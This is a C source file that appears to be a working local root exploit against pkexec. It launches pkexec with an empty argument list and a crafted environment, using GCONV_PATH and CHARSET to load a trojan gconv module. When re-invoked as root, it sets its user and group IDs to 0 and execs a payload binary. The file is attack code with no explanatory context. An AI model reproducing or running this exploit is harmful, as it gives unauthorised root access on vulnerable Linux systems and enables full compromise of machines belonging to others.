#define _POSIX_C_SOURCE 200809L
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <libgen.h>

#include "constants.h"

int main(int argc, char **argv, char **envp)
{
	char *s;
	if (argc >= 2 && strcmp(argv[1], MAGIC_PARAM) == 0) {
		const char errRoot[] = "Successfully started by gconv, but no root privileges!\n";
		if (geteuid() != 0) {
			write(2, errRoot, sizeof(errRoot) - 1);
			return EXIT_FAILURE;
		}
		setuid(0);
		setgid(0);
		if ((s = getenv(SHELL_SAVE))) {
			setenv("SHELL", s, 1);
			unsetenv(SHELL_SAVE);
		}
		unsetenv("CHARSET");
		if ((s = getenv("PATH")) && (s = strchr(s, ':'))) {
			s++;
			setenv("PATH", s, 1);
		}
		char *payloadPath = strdup(PAYLOAD_PATH);
		execve(payloadPath, (char * const []) {basename(payloadPath), NULL}, envp);
	}
	else {
		static const char shellVarName[] = SHELL_SAVE "=";
		static const char pathVarName[] = "PATH=GCONV_PATH=.:";
		char *origShell, *path;
		if ((s = getenv("SHELL"))) {
			origShell = malloc(sizeof(shellVarName) + strlen(s));
			strcpy(origShell, shellVarName);
			strcat(origShell, s);
		} else {
			origShell = NULL;
		}
		if ((s = getenv("PATH"))) {
			path = malloc(sizeof(pathVarName) + strlen(s));
			strcpy(path, pathVarName);
			strcat(path, s);
		} else {
			path = strdup(pathVarName);
			path[sizeof(pathVarName) - 2] = '\0';
		}
		char *newenviron[] = { strdup(TROJAN_GCONV_PATH),
			path,
			strdup("CHARSET=" TROJAN_CHARSET),
			strdup("SHELL=/does/not/exist"),
			origShell,
			NULL };
		execve(PKEXEC_PATH, (char * const *) {NULL}, newenviron);
	}
	return EXIT_FAILURE;
}
